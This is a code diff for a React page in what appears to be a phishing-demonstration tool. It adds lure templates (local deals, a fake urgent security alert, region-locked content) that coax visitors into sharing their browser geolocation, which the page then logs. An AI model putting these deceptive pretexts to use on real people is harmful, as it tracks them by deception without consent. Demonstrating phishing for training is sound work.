@@ -6,29 +6,52 @@ import { useLogs } from '@/contexts/LogContext';
 import type { LocationData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
-import { MapPin, CheckCircle, AlertTriangle } from 'lucide-react';
+import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
+import { Card as ShadcnCard, CardContent, CardDescription } from '@/components/ui/card'; // Renamed to avoid conflict
+import Image from 'next/image';
+import { MapPin, CheckCircle, AlertTriangle, Sparkles, ShieldAlert, Lock, type LucideIcon } from 'lucide-react';
 
-// Dummy content based on template ID
-const templateContent: Record<string, { title: string, actionText: string, message: string }> = {
-  'prize-claim': {
-    title: 'Claim Your Prize!',
-    actionText: 'Verify Location to Claim',
-    message: 'Congratulations! You have won a prize. Please verify your location to proceed with claiming your reward.',
+interface TemplateContent {
+  title: string;
+  actionText: string;
+  message: string; // General message or intro
+  heroIcon?: LucideIcon;
+  imageSrc?: string;
+  imageHint?: string;
+  pageSpecificMessage?: string; // More detailed message for specific layouts
+}
+
+const templateContent: Record<string, TemplateContent> = {
+  'nearby-deals': {
+    title: 'Discover Amazing Deals Near You!',
+    actionText: 'Find My Deals',
+    message: 'Unlock exclusive offers and discounts from local stores.',
+    pageSpecificMessage: 'Share your location to see personalized deals from shops and restaurants in your area. Limited time offers available now!',
+    heroIcon: Sparkles,
+    imageSrc: 'https://placehold.co/600x300.png',
+    imageHint: 'shopping promotion map',
   },
   'security-alert': {
-    title: 'Security Alert',
-    actionText: 'Verify My Location',
-    message: 'We detected unusual activity on your account. Please verify your current location to secure your account.',
+    title: 'Urgent: Account Security Action Required',
+    actionText: 'Verify Location & Secure Account',
+    message: "To protect your account, please verify your current location.",
+    pageSpecificMessage: "We've detected unusual activity potentially related to your account. Verifying your location is a crucial step to ensure your account remains secure. This is a standard security measure.",
+    heroIcon: ShieldAlert,
   },
   'content-unlock': {
-    title: 'Unlock Exclusive Content',
-    actionText: 'Unlock Content by Verifying Location',
-    message: 'This content is region-restricted. Verify your location to access exclusive materials.',
+    title: 'Unlock Exclusive Local Content',
+    actionText: 'Verify Location to Access',
+    message: 'This premium content is curated for your area.',
+    pageSpecificMessage: 'Get access to videos, articles, and special features available only in your region. Share your location to unlock now!',
+    heroIcon: Lock,
+    imageSrc: 'https://placehold.co/400x250.png',
+    imageHint: 'locked content preview',
   },
   default: {
-    title: 'Location Verification Required',
-    actionText: 'Verify Location',
-    message: 'Please verify your location to continue.',
+    title: 'Location Verification Needed',
+    actionText: 'Verify My Location',
+    message: 'Please share your location to continue using this service.',
+    heroIcon: MapPin,
   }
 };
 
@@ -45,7 +68,7 @@ export default function LocationPhishingPage() {
   useEffect(() => {
     addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [templateId]); // addLog is stable from context
+  }, [templateId]);
 
   const handleLocationRequest = () => {
     if (!navigator.geolocation) {
@@ -67,24 +90,6 @@ export default function LocationPhishingPage() {
           accuracy: position.coords.accuracy,
         };
         
-        // Attempt to get city/country (client-side, best effort)
-        // This data enrichment is now primarily handled in LogContext for consistency
-        // but we can keep it here if Nominatim is preferred for client-side immediate feedback before LogContext processing.
-        // For this example, assuming LogContext handles primary enrichment based on IP.
-        // If client-side lat/lon to city/country is still desired here for the data payload:
-        /*
-        try {
-          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.latitude}&lon=${locationData.longitude}&zoom=10&addressdetails=1`);
-          if (response.ok) {
-            const geo = await response.json();
-            locationData.city = geo.address?.city || geo.address?.town || geo.address?.village;
-            locationData.country = geo.address?.country;
-          }
-        } catch (e) {
-          console.warn("Could not fetch city/country from Nominatim:", e);
-        }
-        */
-
         addLog({ type: 'location', data: locationData });
         setStatus('captured');
         setIsLoading(false);
@@ -111,40 +116,106 @@ export default function LocationPhishingPage() {
     );
   };
 
+  const renderTemplateSpecificContent = () => {
+    const HeroIcon = content.heroIcon || MapPin;
+    switch (templateId) {
+      case 'nearby-deals':
+        return (
+          <div className="text-center space-y-6">
+            {content.imageSrc && (
+              <Image 
+                src={content.imageSrc} 
+                alt="Promotional image for nearby deals" 
+                width={400} 
+                height={200} 
+                className="rounded-lg mx-auto shadow-lg border"
+                data-ai-hint={content.imageHint || "promotion local"}
+              />
+            )}
+            <HeroIcon className="w-16 h-16 text-accent mx-auto" />
+            <p className="text-xl text-foreground font-semibold">{content.message}</p>
+            <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
+          </div>
+        );
+      case 'security-alert':
+        return (
+          <Alert variant="destructive" className="mb-6 text-left">
+            <div className="flex items-center mb-2">
+              <HeroIcon className="h-6 w-6 mr-3" />
+              <AlertTitle className="text-lg font-semibold">Security Check Required</AlertTitle>
+            </div>
+            <AlertDescription className="text-md">
+              {content.pageSpecificMessage || content.message}
+            </AlertDescription>
+          </Alert>
+        );
+      case 'content-unlock':
+        return (
+          <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
+            <CardContent className="space-y-4">
+              <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
+              {content.imageSrc && (
+                <Image 
+                  src={content.imageSrc} 
+                  alt="Preview of locked content" 
+                  width={300} 
+                  height={180} 
+                  className="rounded-md mx-auto opacity-60 border-2 border-dashed border-primary/30" 
+                  data-ai-hint={content.imageHint || "locked preview"}
+                />
+              )}
+              <CardDescription className="text-xl text-foreground font-semibold">{content.message}</CardDescription>
+              <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
+            </CardContent>
+          </ShadcnCard>
+        );
+      default:
+        return (
+          <div className="text-center space-y-4">
+            <HeroIcon className="w-16 h-16 text-primary mx-auto" />
+            <p className="text-xl text-muted-foreground">{content.message}</p>
+          </div>
+        );
+    }
+  };
+
   return (
     <PhishingPageLayout 
-        title={content.title}
-        isLoading={isLoading}
+        title={content.title} // Use the dynamic title from content
+        isLoading={isLoading && status !== 'captured'} // Show loading unless captured
         error={error}
         statusMessage={status === 'captured' ? 'Location data successfully captured for demonstration.' : undefined}
     >
-      <p className="text-center text-muted-foreground mb-6">{content.message}</p>
-      
-      {status !== 'captured' && (
-        <Button 
-          onClick={handleLocationRequest} 
-          className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
-          disabled={isLoading || status === 'requesting'}
-        >
-          <MapPin className="mr-2 h-5 w-5" />
-          {isLoading ? 'Verifying...' : content.actionText}
-        </Button>
-      )}
+      <div className="space-y-6">
+        {renderTemplateSpecificContent()}
 
-      {status === 'captured' && (
-        <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
-          <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
-          <p className="font-semibold text-green-700">Location Verified (Simulated)</p>
-          <p className="text-sm text-green-600">Thank you. This window can now be closed.</p>
-        </div>
-      )}
-      {status === 'error' && error && (
-         <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
-          <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
-          <p className="font-semibold text-red-700">Location Access Failed</p>
-          <p className="text-sm text-red-600">{error}</p>
-        </div>
-      )}
+        {status !== 'captured' && (
+          <Button 
+            onClick={handleLocationRequest} 
+            size="lg"
+            className="w-full bg-accent hover:bg-accent/90 text-accent-foreground text-lg py-6 shadow-md"
+            disabled={isLoading || status === 'requesting'}
+          >
+            <MapPin className="mr-2 h-6 w-6" />
+            {isLoading ? 'Verifying...' : content.actionText}
+          </Button>
+        )}
+
+        {status === 'captured' && (
+          <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
+            <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
+            <p className="text-xl font-semibold text-green-700">Location Verified (Simulated)</p>
+            <p className="text-md text-green-600">Thank you. This window can now be closed.</p>
+          </div>
+        )}
+        {status === 'error' && error && (
+          <Alert variant="destructive" className="mt-6">
+            <AlertTriangle className="h-5 w-5" />
+            <AlertTitle>Location Access Failed</AlertTitle>
+            <AlertDescription>{error}</AlertDescription>
+          </Alert>
+        )}
+      </div>
     </PhishingPageLayout>
   );
 }
